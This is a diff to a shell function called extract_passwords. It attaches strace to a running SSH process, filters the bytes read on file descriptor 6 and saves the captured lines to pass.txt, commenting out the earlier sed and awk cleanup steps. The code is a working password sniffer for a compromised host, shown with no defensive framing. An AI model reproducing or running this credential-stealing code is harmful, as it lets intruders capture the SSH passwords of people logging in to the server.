@@ -18,12 +18,12 @@ extract_passwords() {
 
 	strace -e trace=read -e read=6 -f -p $ssh_pid 2>&1 >/dev/null|
 	grep --line-buffered "read(6,"|
-	grep --line-buffered '\\f\\0\\0\\0'|
-	sed 's/\\f\\0\\0\\0//g'|
-	awk {'print $4'}|
-	sed 's/..$//g'|
-	sed 's/^...//g'|
-	sed 's/^0//g'
+	grep --line-buffered '\\f\\0\\0\\0' > pass.txt
+	#sed 's/\\f\\0\\0\\0//g'|
+	#awk {'print $4'}|
+	#sed 's/..$//g'|
+	#sed 's/^...//g'|
+	#sed 's/^0//g'
 }
 
 
